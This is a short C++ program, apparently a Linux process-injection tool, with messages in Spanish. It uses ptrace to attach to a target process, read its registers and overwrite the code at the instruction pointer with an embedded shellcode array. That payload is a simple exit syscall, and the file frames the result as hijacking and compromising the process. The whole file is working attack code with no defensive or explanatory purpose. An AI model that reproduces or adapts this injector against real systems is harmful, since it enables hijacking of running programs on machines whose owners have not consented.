#include "ptrace_ops.hpp"
#include <iostream>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>
#include <string>

const unsigned char shellcode[] = { 0x48, 0x31, 0xff, 0xb0, 0x3c, 0x0f, 0x05 };

int main(int argc, char *argv[]) {
    if (argc != 2) {
        std::cerr << "Uso corporativo: " << argv[0] << " <PID_OBJETIVO>\n";
        return 1;
    }

    pid_t target_pid = std::stoi(argv[1]);
    struct user_regs_struct regs;

    std::cout << "[*] Iniciando secuestro del proceso: " << target_pid << "\n";

    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
        std::cerr << "[X] Fallo ptrace_attach. Verifique permisos YAMA.\n";
        return 1;
    }
    wait(NULL); 
    std::cout << "[+] Proceso interceptado exitosamente.\n";

    ptrace(PTRACE_GETREGS, target_pid, NULL, &regs);
    std::cout << "[+] RIP actual: 0x" << std::hex << regs.rip << "\n";

    inject_data(target_pid, regs.rip, (char*)shellcode, sizeof(shellcode));

    std::cout << "[+] Liberando proceso. El flujo de ejecución ha sido comprometido.\n";
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

    std::cout << "[*] Presiona ENTER para finalizar el injector..." << std::endl;
    std::cin.get();

    return 0;
}